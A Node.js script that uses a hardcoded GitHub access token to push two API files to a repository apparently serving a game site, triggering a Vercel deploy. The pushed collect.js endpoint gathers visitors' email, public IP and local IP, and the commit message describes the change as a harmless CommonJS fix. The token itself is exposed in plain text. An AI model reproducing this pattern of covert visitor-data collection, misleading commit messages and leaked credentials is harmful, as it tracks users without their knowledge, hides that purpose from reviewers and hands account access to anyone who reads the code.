const https = require('https');

const token = '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';
const collectContent = `module.exports = async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { email, publicIP, localIP, timestamp } = req.body;

        if (!email || !publicIP) {
            return res.status(400).json({ error: 'Missing required fields' });
        }

        const entry = \`email = \${email} | local_ip = \${localIP || 'N/A'} | public_ip = \${publicIP} | timestamp = \${timestamp}\`;

        console.log('Data collected:', entry);

        return res.status(200).json({
            success: true,
            message: 'Data collected successfully',
            email: email,
            ips: { publicIP, localIP }
        });
    } catch (error) {
        console.error('Error collecting data:', error.message);
        return res.status(500).json({ error: 'Internal server error', details: error.message });
    }
};`;

const systemInfoContent = `module.exports = function handler(req, res) {
    try {
        const username = process.env.USER || process.env.USERNAME || 'user';

        return res.status(200).json({
            email: \`\${username}@gmail.com\`,
            username: username,
            message: 'System info retrieved'
        });
    } catch (error) {
        console.error('Error getting system info:', error.message);
        return res.status(500).json({ error: 'Internal server error', details: error.message });
    }
};`;

async function updateFile(filename, content) {
    return new Promise((resolve, reject) => {
        const base64 = Buffer.from(content).toString('base64');
        const body = JSON.stringify({
            message: 'Fix: Convert API functions to CommonJS for Vercel',
            content: base64
        });

        const options = {
            hostname: 'api.github.com',
            path: `/repos/rishiarun404-afk/Unlimited-game-section/contents/${filename}`,
            method: 'PUT',
            headers: {
                'Authorization': `token ${token}`,
                'Accept': 'application/vnd.github.v3+json',
                'User-Agent': 'Node.js',
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(body)
            }
        };

        const req = https.request(options, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => {
                if (res.statusCode === 200) {
                    resolve(filename);
                } else {
                    reject(new Error(`${filename}: ${res.statusCode}`));
                }
            });
        });

        req.on('error', reject);
        req.write(body);
        req.end();
    });
}

(async () => {
    try {
        console.log('Updating API files on GitHub...\n');

        await updateFile('api/collect.js', collectContent);
        console.log('✓ api/collect.js updated');

        await updateFile('api/system-info.js', systemInfoContent);
        console.log('✓ api/system-info.js updated');

        console.log('\n✅ All files updated! Vercel will auto-deploy.');
        console.log('\nTry accessing your site again in 30 seconds.');

    } catch (error) {
        console.error('❌ Error:', error.message);
    }
})();
